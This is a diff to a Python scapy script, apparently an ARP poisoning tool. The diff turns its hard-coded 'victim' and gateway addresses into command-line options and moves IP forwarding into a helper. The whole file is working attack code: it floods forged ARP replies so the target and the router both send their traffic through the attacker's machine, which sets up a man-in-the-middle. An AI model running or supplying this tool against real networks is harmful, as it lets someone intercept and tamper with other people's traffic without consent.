@@ -1,12 +1,17 @@
 #!/usr/bin/env python3
 
-import scapy.all as scapy
-import time
 import sys
+import time
+import argparse
+import scapy.all as scapy
+from rules import enable_ip_forwarding
 
-# Configuration
-TARGET_IP = "192.168.2.12"      # Victim IP
-GATEWAY_IP = "192.168.2.254"    # Router/Gateway IP
+def parse_args():
+    p = argparse.ArgumentParser(description="ARP Poisoning Tool")
+    p.add_argument("--target-ip", default="192.168.2.12", help="Target host IP")
+    p.add_argument("--gateway-ip", default="192.168.2.254", help="Gateway/router IP")
+    p.add_argument("--interval", type=float, default=0.1, help="Loop delay in seconds")
+    return p.parse_args()
 
 def get_mac(ip):
     """
@@ -29,7 +34,7 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     """
-    Sends a spoofed ARP packet.
+    Sends a spoofed ARP packet. After the spoofing, the target will associate the spoof_ip with our MAC address.
 
     :param target_ip: The IP address of the target machine
     :param spoof_ip: The IP address to spoof (the one we are pretending to be)
@@ -39,7 +44,7 @@ def spoof(target_ip, spoof_ip):
         return
 
     # Create the ARP packet with Ethernet header (op=2 means ARP Reply)
-    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # No hwsrc means that we use our own MAC address
     
     # Send the packet
     scapy.sendp(packet, verbose=False)
@@ -61,35 +66,33 @@ def restore(dest_ip, source_ip):
         # Send the packet multiple times to ensure restoration
         scapy.sendp(packet, count=4, verbose=False)
 
-# Main Execution
-if __name__ == "__main__":
+def main(target_ip, gateway_ip, interval):
     try:
-        print(f"[*] Starting ARP Spoofer on {TARGET_IP} <--> {GATEWAY_IP}")
-        
-        # Enable IP Forwarding automatically (Linux only)
-        try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                f.write("1")
-            print("[*] IP Forwarding enabled.")
-        except Exception as e:
-            print(f"[!] Could not enable IP forwarding automatically: {e}")
-            print("[!] Please run: echo 1 > /proc/sys/net/ipv4/ip_forward")
+        enable_ip_forwarding()
 
-        sent_packets_count = 0
+        print(f"[*] ARP Poisoning started on {target_ip} <--> {gateway_ip}")
+
         while True:
             # Tell the Victim that I am the Router
-            spoof(TARGET_IP, GATEWAY_IP)
+            spoof(target_ip, gateway_ip)
             
             # Tell the Router that I am the Victim
-            spoof(GATEWAY_IP, TARGET_IP)
+            spoof(gateway_ip, target_ip)
             
-            sent_packets_count += 2
-            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
-            
-            time.sleep(0.1)
+            time.sleep(interval)
 
     except KeyboardInterrupt:
         print("\n[!] CTRL+C detected. Restoring ARP tables...")
         restore(TARGET_IP, GATEWAY_IP)
         restore(GATEWAY_IP, TARGET_IP)
         print("[+] Network restored. Exiting.")
+
+# Main Execution
+if __name__ == "__main__":
+    args = parse_args()
+
+    TARGET_IP = args.target_ip          # Victim IP
+    GATEWAY_IP = args.gateway_ip        # Router/Gateway IP
+    INTERVAL = args.interval            # Loop delay in seconds
+
+    main(TARGET_IP, GATEWAY_IP, INTERVAL)
